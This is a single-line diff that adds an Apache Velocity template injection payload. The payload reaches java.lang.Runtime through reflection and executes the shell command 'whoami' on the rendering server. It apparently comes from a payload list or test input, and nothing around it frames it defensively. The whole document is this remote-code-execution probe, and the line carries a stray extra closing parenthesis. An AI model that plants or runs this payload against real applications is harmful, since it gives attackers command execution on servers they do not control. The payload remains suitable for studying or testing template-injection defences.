@@ -1,0 +1,1 @@
+#set($exp="test")$exp.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("whoami"))
